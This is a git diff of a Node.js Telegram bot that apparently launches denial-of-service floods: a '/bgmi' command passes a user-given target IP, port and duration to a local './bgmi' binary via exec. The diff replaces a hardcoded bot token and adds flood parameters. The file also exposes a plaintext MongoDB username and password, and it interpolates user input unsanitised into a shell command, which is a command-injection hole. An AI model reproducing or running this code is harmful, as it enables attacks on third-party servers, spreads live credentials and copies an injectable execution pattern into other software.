@@ -7,7 +7,7 @@ const { createCanvas } = require('canvas');
 const mongoose = require('mongoose');
 
 // Insert your Telegram bot token here
-const bot = new TelegramBot('7243507478:AAGbl43hj5HOtRzbyIMdU1KU0XYclyQcksI', { polling: true });
+const bot = new TelegramBot('7316116793:AAEhQ3Lol6GkoDiWlGBTyjrXYy6324rGyho', { polling: true });
 
 mongoose.connect('mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv')
     .then(() => console.log("✅ Connected to MongoDB"))
@@ -97,7 +97,7 @@ bot.onText(/\/bgmi (\S+) (\d+) (\d+)/, async (msg, match) => {
 
     sendCountdownMessage(userId, time, target, port);
 
-    const command = `./bgmi ${target} ${port} ${time}`;
+    const command = `./bgmi ${target} ${port} ${time} 9 100`;
     exec(command, (error, stdout, stderr) => {
         if (error) {
             bot.sendMessage(userId, `❌ Error executing attack: ${error.message}`);
